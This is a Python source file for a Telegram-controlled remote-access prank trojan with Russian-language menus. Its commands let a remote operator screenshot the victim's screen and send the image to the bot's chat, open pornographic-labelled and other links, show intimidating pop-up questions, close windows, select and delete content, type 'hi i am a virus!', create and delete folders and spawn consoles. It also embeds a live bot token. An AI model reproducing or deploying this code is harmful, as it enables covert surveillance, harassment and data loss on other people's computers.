import os
import time
import telebot
import pyautogui as pg
import webbrowser as web

api = telebot.TeleBot('2120009815:AAFxqqHJ_edmgMauV4WhswWYbQEUd-AjD_w')

class Menu:
	def __init__(self, chat_id, answer):
		self.markup = telebot.types.ReplyKeyboardMarkup(True)
		self.chat_id = chat_id
		self.answer = answer
	
	def MainMenu(self):
		self.markup.row('Помощь')
		self.markup.row('Перейти к управлению')
		api.send_message(self.chat_id, text=self.answer, reply_markup=self.markup)
	
	def LastMenu(self):
		self.markup.row('Открыть сайт')
		self.markup.row('Параметры', 'Окна', 'Скриншот')
		self.markup.row('Главное меню')
		api.send_message(self.chat_id, text=self.answer, reply_markup=self.markup)
		
	def SiteMenu(self):
		self.markup.row('Порно', 'Видео мем', 'Стоны')
		self.markup.row('Вк', 'Фото мем', 'Позже')
		self.markup.row('Назад')
		api.send_message(self.chat_id, text=self.answer, reply_markup=self.markup)

@api.message_handler(commands=['start'])
def main_menu(message):
	Menu.MainMenu(Menu(message.chat.id, '🖥 Подключен\n'))

@api.message_handler(content_types=['text'])
def last_menu(message):
	if message.text == 'Перейти к управлению':
		Menu.LastMenu(Menu(message.chat.id, f'Панель управления'))
	elif message.text == 'Главное меню':
		Menu.MainMenu(Menu(message.chat.id, f'Главное меню'))
	elif message.text == 'Назад':
		Menu.LastMenu(Menu(message.chat.id, f'Панель управления'))
	elif message.text == 'Открыть сайт':
		Menu.SiteMenu(Menu(message.chat.id, f'Выбор сайта'))
	elif message.text == 'Скриншот':
		api.send_photo(message.chat.id, pg.screenshot("screenshot.png"))
		os.remove("screenshot.png")
	elif message.text == 'Порно':
		print(message.text)
		web.open('https://vk.com')
	elif message.text == 'Окна':
		pg.confirm(text='Ответь мне на пару вопросов!', title='Привет', buttons=['OK'])
		pg.confirm(text='Ты мальчик?', title='Вопрос 1', buttons=['Yes', 'No'])
		pg.confirm(text='Ты девочка?', title='Вопрос 2', buttons=['Yes', 'No'])
		pg.confirm(text='Ты учешся?', title='Вопрос 3', buttons=['Yes', 'No'])
		pg.confirm(text='Ты работаешь?', title='Вопрос 4', buttons=['Yes', 'No'])
		pg.confirm(text='Тебе страшно?', title='Вопрос 5', buttons=['Yes', 'No'])
	elif message.text  == 'Видео мем':
		web.open("https://www.youtube.com/watch?v=tnifiOpkYLw")
	elif message.text == 'Стоны':
		web.open("https://www.youtube.com/watch?v=Zqu9WwkwSr0")
	elif message.text == 'Вк':
		web.open("https://vk.com")
	elif message.text == 'Фото мем':
		web.open("data:image/jpeg;base64,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")
	elif message.text == 'Параметры':
		pg.hotkey('win', 'i')
	elif message.text == 'свернуть окна':
		for i in range(1, 25):
			pg.hotkey('win', ',')
			time.sleep(2)
	elif message.text == 'закрыть окна':
		for i in range(1, 10):
			time.sleep(2)
			pg.hotkey('alt', 'f4')
	elif message.text == 'выделить всё и удалить':
		pg.hotkey('ctrl', 'a')
		pg.hotkey('del')
	elif message.text == 'Открыть папку':
		pg.hotkey('win', 'e')
	elif message.text == 'отправить текст':
		pg.typewrite('hi i am a virus!')
		pg.hotkey('enter')
	elif message.text == '':
		pg.hotkey('win', 'i')
	elif message.text == 'удалить папки':
		for i in range(1, 50):
			os.rmdir(f'{i}')
	elif message.text == 'создать папки':
		for i in range(1, 50):
			os.mkdir(f'{i}')
	elif message.text == 'консоли':
		for i in range(1, 50):
			time.sleep(2)
			os.system(f'start ')

api.polling()
